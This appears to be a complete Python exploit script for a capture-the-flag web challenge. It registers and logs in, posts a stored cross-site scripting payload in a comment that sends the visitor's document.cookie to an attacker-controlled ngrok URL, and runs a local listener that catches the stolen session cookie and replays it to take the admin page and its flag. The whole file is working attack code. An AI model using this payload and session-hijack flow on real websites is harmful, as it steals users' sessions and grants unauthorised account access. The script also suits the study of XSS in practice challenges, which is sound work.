#!/usr/bin/env python3
import re
import requests
import sys
import http.server
import threading

session_cookie_name = 'x-wing'
username = 'test'
password = 'test'


class GetHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if session_cookie_name in self.path:
            session_cookie = self.path.split('=')[1]
            print("Session cookie found:", session_cookie)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'thx for session cookie')
            print("Getting flag...")
            resp = requests.get(challenge_url + '/admin',
                                cookies={session_cookie_name: session_cookie})
            flag_re = 'flag{.*}'
            flag = re.findall(flag_re, resp.text)[0]
            print("Flag:", flag)
            exit(0)
        print(self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'thx for visiting')


def start_server():
    server_address = ('localhost', 8000)
    httpd = http.server.HTTPServer(server_address, GetHandler)
    httpd.serve_forever()


def gen_payload(url):
    return f"<script>window.location='{url}/'+document.cookie;</script>"


def signup_user(s, url):
    print('Signing up user...')
    data = {
        'username': username,
        'password': password
    }
    s.post(url + '/signup', data=data)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ngrok-url> <challenge-url>")
        exit(-1)

    ngrok_url = sys.argv[1]
    challenge_url = sys.argv[2]

    s = requests.Session()

    print("Signing up user...")
    data = {
        'username': username,
        'password': password,
        'password2': password,
    }
    s.post(challenge_url + '/signup', data=data)

    print("Logging in...")
    data = {
        'username': username,
        'password': password
    }
    s.post(challenge_url + '/signin', data=data)

    print("Sending payload...")
    payload = gen_payload(ngrok_url)
    data = {
        'content': payload
    }
    s.post(challenge_url + '/comment/1', data=data)

    print('Starting server...')
    thread = threading.Thread(target=start_server)
    thread.daemon = True
    thread.start()
    print('Server started.')

    while thread.is_alive():
        pass
